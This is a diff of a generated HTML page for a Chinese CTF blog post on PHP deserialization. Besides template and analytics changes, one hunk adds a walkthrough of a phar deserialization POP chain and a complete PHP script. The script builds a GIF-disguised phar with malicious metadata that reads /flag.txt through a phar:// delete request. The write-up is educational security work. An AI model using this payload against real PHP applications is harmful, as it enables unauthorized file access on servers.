@@ -2,10 +2,13 @@
 <html lang=en>
 <head>
     <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
     <meta name="description" content="UNDONE phar反序列化中关键标识绕过可以任意zip等吗？ phar出发函数支持通配符吗？ phar是可以没有 [https:&#x2F;&#x2F;blog.csdn.net&#x2F;MrWangisgoodboy&#x2F;article&#x2F;details&#x2F;130146658]中phar签名问题 session上传中无需进行闭合吗？其实要闭合也不难的，也是origin和target这样，往target凑即可  POP链常用魔术">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php反序列化利用">
@@ -18,37 +21,42 @@
 <meta property="og:image" content="https://kc1zs4.github.io/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/session_uploadprogress.png">
 <meta property="og:image" content="https://kc1zs4.github.io/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/session_upload_progress_name.png">
 <meta property="article:published_time" content="2024-11-07T08:50:02.960Z">
-<meta property="article:modified_time" content="2024-11-08T07:33:06.971Z">
-<meta property="article:tag" content="php">
-<meta property="article:tag" content="all in one">
-<meta property="article:tag" content="php serialize">
+<meta property="article:modified_time" content="2025-02-26T11:43:27.303Z">
+<meta property="article:tag" content="PHP安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://kc1zs4.github.io/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/phar_affectedfunc.png">
-    
-    
+<meta name="twitter:image" content="https://kc1zs4.github.io/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/phar_affectedfunc.png">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
       
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
     <!-- title -->
     <title>php反序列化利用</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
 
-    <!-- Umami Analytics -->
+ <!-- Umami Analytics -->
 
 
     <!-- styles -->
@@ -58,10 +66,9 @@
     <!-- persian styles -->
     
     <!-- rss -->
+     
+    <!-- mathjax -->
     
-    
-	<!-- mathjax -->
-	
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -75,8 +82,6 @@
       <ul>
         <!--
        --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
@@ -92,7 +97,7 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/2024/11/08/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -166,7 +171,7 @@
       
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/all-in-one/" rel="tag">all in one</a>, <a class="p-category" href="/tags/php/" rel="tag">php</a>, <a class="p-category" href="/tags/php-serialize/" rel="tag">php serialize</a>
+        <a class="p-category" href="/tags/PHP%E5%AE%89%E5%85%A8/" rel="tag">PHP安全</a>
     </div>
 
 
@@ -331,21 +336,28 @@
 <p>上面思路方向是对，但是偏的有点严重了，重新来一下</p>
 </blockquote>
 <ol>
-<li><em><strong>这里应该从宏观出发</strong></em></li>
-<li>最终是要获取&#x2F;flag.php或者&#x2F;flag.txt这样，这里没有自定义函数，应该是到不了rce的地步，直接读文件的话</li>
-<li>寻找<em><strong>可控输入点</strong></em><ol>
+<li><p><em><strong>这里应该从宏观出发</strong></em></p>
+</li>
+<li><p>最终是要获取&#x2F;flag.php或者&#x2F;flag.txt这样，这里没有自定义函数，应该是到不了rce的地步，直接读文件的话</p>
+</li>
+<li><p>寻找<em><strong>可控输入点</strong></em></p>
+<ol>
 <li>download.php中的filename</li>
 <li>delete.php中的filename</li>
 </ol>
 </li>
-<li>这里因为download中有ini_set的open_basedir，所以似乎读不了，会被限制住，在include的class.php中也有，根本无法读</li>
-<li>先从文件出发吧，有download.php的get_file_contents不行的话，就只有File的close方法了，这里要求有一个File对象的filename是&#x2F;flag.txt这样还需要调用close方法？<ol>
+<li><p>这里因为download中有ini_set的open_basedir，所以似乎读不了，会被限制住，在include的class.php中也有，根本无法读</p>
+</li>
+<li><p>先从文件出发吧，有download.php的get_file_contents不行的话，就只有File的close方法了，这里要求有一个File对象的filename是&#x2F;flag.txt这样还需要调用close方法？</p>
+<ol>
 <li>phar get_file_contents中反序列化自定义，有open_basedir不行</li>
 <li>phar unlink中也可以反序列化自定义 –&gt; <em><strong>phar出发函数不知一个</strong></em></li>
 </ol>
 </li>
-<li>观察到另一个close的话是User里的了，通过设置User的对应属性是一个File对象可以吗，可以的，调用close方法，只有返回没有输出，还有FileList类啊，有<code>__destruct</code>可以输出通过FileList调用的File函数的返回内容 –&gt; User -&gt; FileList: <code>close</code> -&gt; File: <code>close</code> -&gt; FileList: <code>__destruct</code></li>
-<li>最终payload见src&#x2F;Dropbox&#x2F;payload.php</li>
+<li><p>观察到另一个close的话是User里的了，通过设置User的对应属性是一个File对象可以吗，可以的，调用close方法，只有返回没有输出，还有FileList类啊，有<code>__destruct</code>可以输出通过FileList调用的File函数的返回内容 –&gt; User -&gt; FileList: <code>close</code> -&gt; File: <code>close</code> -&gt; FileList: <code>__destruct</code></p>
+</li>
+<li><p>最终payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="keyword">new</span> <span class="title class_">File</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>(); <span class="comment">// 这个就是phar要包含的对象了</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&#x27;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//将自定义的meta-data存入manifest，这一步注入攻击</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;nothing.txt&quot;</span>, <span class="string">&quot;nothing&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随后进行改名为phar.gif</span></span><br><span class="line"><span class="comment">// 点击删除</span></span><br><span class="line"><span class="comment">// 截取filename=phar://phar.gif</span></span><br><span class="line"><span class="comment">// 成功获取flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
 </ol>
 <h5 id="Phar例1总结"><a href="#Phar例1总结" class="headerlink" title="*Phar例1总结"></a>*Phar例1总结</h5><ol>
 <li><em><strong>思路上</strong></em><ol>
@@ -480,6 +492,12 @@
   </div>
 </article>
 
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
 
 
         
@@ -490,8 +508,6 @@
       <ul>
         
           <li><a href="/">Home</a></li>
-        
-          <li><a href="/about/">About</a></li>
         
           <li><a href="/archives/">Writing</a></li>
         
@@ -546,7 +562,7 @@
     Copyright &copy;
     
     
-    2023-2024
+    2023-2025
     KC1zs4&#39;s Blog
   </div>
   <div class="footer-right">
@@ -554,8 +570,6 @@
       <ul>
         <!--
        --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
@@ -659,6 +673,18 @@
 <!-- Cloudflare Analytics -->
 
 <!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
 <!-- utterances Comments -->
 
